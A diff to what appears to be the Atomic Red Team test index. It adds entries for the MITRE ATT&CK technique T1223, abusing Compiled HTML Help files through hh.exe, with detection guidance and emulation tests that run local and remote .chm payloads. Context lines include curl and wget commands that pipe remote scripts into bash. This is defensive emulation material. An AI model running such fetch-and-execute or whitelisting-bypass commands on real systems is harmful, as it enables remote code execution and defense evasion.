@@ -4254,6 +4254,101 @@ defense-evasion:
       modified: '2018-10-31T13:45:13.024Z'
       created: '2018-10-17T00:14:20.652Z'
     atomic_tests: []
+  T1223:
+    technique:
+      id: attack-pattern--d21a2069-23d5-4043-ad6d-64f6b644cb1a
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: Compiled HTML File
+      description: |-
+        Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)
+
+        Adversaries may abuse this technology to conceal malicious code. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)
+      external_references:
+      - external_id: T1223
+        url: https://attack.mitre.org/techniques/T1223
+        source_name: mitre-attack
+      - url: https://docs.microsoft.com/previous-versions/windows/desktop/htmlhelp/microsoft-html-help-1-4-sdk
+        description: Microsoft. (2018, May 30). Microsoft HTML Help 1.4. Retrieved
+          October 3, 2018.
+        source_name: Microsoft HTML Help May 2018
+      - url: https://msdn.microsoft.com/windows/desktop/ms644670
+        description: Microsoft. (n.d.). HTML Help ActiveX Control Overview. Retrieved
+          October 3, 2018.
+        source_name: Microsoft HTML Help ActiveX
+      - url: https://msdn.microsoft.com/windows/desktop/ms524405
+        description: Microsoft. (n.d.). About the HTML Help Executable Program. Retrieved
+          October 3, 2018.
+        source_name: Microsoft HTML Help Executable Program
+      - url: https://msitpros.com/?p=3909
+        description: Moe, O. (2017, August 13). Bypassing Device guard UMCI using
+          CHM – CVE-2017-8625. Retrieved October 3, 2018.
+        source_name: MsitPros CHM Aug 2017
+      - url: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8625
+        description: Microsoft. (2017, August 8). CVE-2017-8625 - Internet Explorer
+          Security Feature Bypass Vulnerability. Retrieved October 3, 2018.
+        source_name: Microsoft CVE-2017-8625 Aug 2017
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_contributors:
+      - Rahmat Nurfauzi, @infosecn1nja, PT Xynexis International
+      x_mitre_data_sources:
+      - File monitoring
+      - Process monitoring
+      - Process command-line parameters
+      x_mitre_defense_bypassed:
+      - Application whitelisting
+      x_mitre_detection: |-
+        Monitor and analyze the execution and arguments of hh.exe. (Citation: MsitPros CHM Aug 2017) Compare recent invocations of hh.exe with prior history of known good arguments to determine anomalous and potentially adversarial activity (ex: obfuscated and/or malicious commands). Non-standard process execution trees may also indicate suspicious or malicious behavior, such as if hh.exe is the parent process for suspicious processes and activity relating to other adversarial techniques.
+
+        Monitor presence and use of CHM files, especially if they are not typically used within an environment.
+      x_mitre_permissions_required:
+      - User
+      x_mitre_remote_support: false
+      x_mitre_platforms:
+      - Windows
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: defense-evasion
+        kill_chain_name: mitre-attack
+      - phase_name: execution
+        kill_chain_name: mitre-attack
+      modified: '2018-10-31T13:45:13.024Z'
+      created: '2018-10-17T00:14:20.652Z'
+      identifier: T1223
+    atomic_tests:
+    - name: Compiled HTML Help Local Payload
+      description: 'Uses hh.exe to execute a local compiled HTML Help payload.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        local_chm_file:
+          description: Local .chm payload
+          type: path
+          default: C:\atomic-red-team\atomics\T1223\src\T1223.chm
+      executor:
+        name: command_prompt
+        command: 'hh.exe #{local_chm_file}
+
+'
+    - name: Compiled HTML Help Remote Payload
+      description: 'Uses hh.exe to execute a remote compiled HTML Help payload.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_chm_file:
+          description: Remote .chm payload
+          type: url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm
+      executor:
+        name: command_prompt
+        command: 'hh.exe #{remote_chm_file}
+
+'
   T1122:
     technique:
       id: attack-pattern--9b52fca7-1a36-4da0-b62d-da5bd83b4d69
@@ -13150,6 +13245,101 @@ execution:
         command: |
           bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
           bash -c "wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash"
+  T1223:
+    technique:
+      id: attack-pattern--d21a2069-23d5-4043-ad6d-64f6b644cb1a
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      name: Compiled HTML File
+      description: |-
+        Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)
+
+        Adversaries may abuse this technology to conceal malicious code. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)
+      external_references:
+      - external_id: T1223
+        url: https://attack.mitre.org/techniques/T1223
+        source_name: mitre-attack
+      - url: https://docs.microsoft.com/previous-versions/windows/desktop/htmlhelp/microsoft-html-help-1-4-sdk
+        description: Microsoft. (2018, May 30). Microsoft HTML Help 1.4. Retrieved
+          October 3, 2018.
+        source_name: Microsoft HTML Help May 2018
+      - url: https://msdn.microsoft.com/windows/desktop/ms644670
+        description: Microsoft. (n.d.). HTML Help ActiveX Control Overview. Retrieved
+          October 3, 2018.
+        source_name: Microsoft HTML Help ActiveX
+      - url: https://msdn.microsoft.com/windows/desktop/ms524405
+        description: Microsoft. (n.d.). About the HTML Help Executable Program. Retrieved
+          October 3, 2018.
+        source_name: Microsoft HTML Help Executable Program
+      - url: https://msitpros.com/?p=3909
+        description: Moe, O. (2017, August 13). Bypassing Device guard UMCI using
+          CHM – CVE-2017-8625. Retrieved October 3, 2018.
+        source_name: MsitPros CHM Aug 2017
+      - url: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8625
+        description: Microsoft. (2017, August 8). CVE-2017-8625 - Internet Explorer
+          Security Feature Bypass Vulnerability. Retrieved October 3, 2018.
+        source_name: Microsoft CVE-2017-8625 Aug 2017
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_contributors:
+      - Rahmat Nurfauzi, @infosecn1nja, PT Xynexis International
+      x_mitre_data_sources:
+      - File monitoring
+      - Process monitoring
+      - Process command-line parameters
+      x_mitre_defense_bypassed:
+      - Application whitelisting
+      x_mitre_detection: |-
+        Monitor and analyze the execution and arguments of hh.exe. (Citation: MsitPros CHM Aug 2017) Compare recent invocations of hh.exe with prior history of known good arguments to determine anomalous and potentially adversarial activity (ex: obfuscated and/or malicious commands). Non-standard process execution trees may also indicate suspicious or malicious behavior, such as if hh.exe is the parent process for suspicious processes and activity relating to other adversarial techniques.
+
+        Monitor presence and use of CHM files, especially if they are not typically used within an environment.
+      x_mitre_permissions_required:
+      - User
+      x_mitre_remote_support: false
+      x_mitre_platforms:
+      - Windows
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: defense-evasion
+        kill_chain_name: mitre-attack
+      - phase_name: execution
+        kill_chain_name: mitre-attack
+      modified: '2018-10-31T13:45:13.024Z'
+      created: '2018-10-17T00:14:20.652Z'
+      identifier: T1223
+    atomic_tests:
+    - name: Compiled HTML Help Local Payload
+      description: 'Uses hh.exe to execute a local compiled HTML Help payload.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        local_chm_file:
+          description: Local .chm payload
+          type: path
+          default: C:\atomic-red-team\atomics\T1223\src\T1223.chm
+      executor:
+        name: command_prompt
+        command: 'hh.exe #{local_chm_file}
+
+'
+    - name: Compiled HTML Help Remote Payload
+      description: 'Uses hh.exe to execute a remote compiled HTML Help payload.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        remote_chm_file:
+          description: Remote .chm payload
+          type: url
+          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm
+      executor:
+        name: command_prompt
+        command: 'hh.exe #{remote_chm_file}
+
+'
   '':
     technique:
       id: attack-pattern--ebbe170d-aa74-4946-8511-9921243415a3
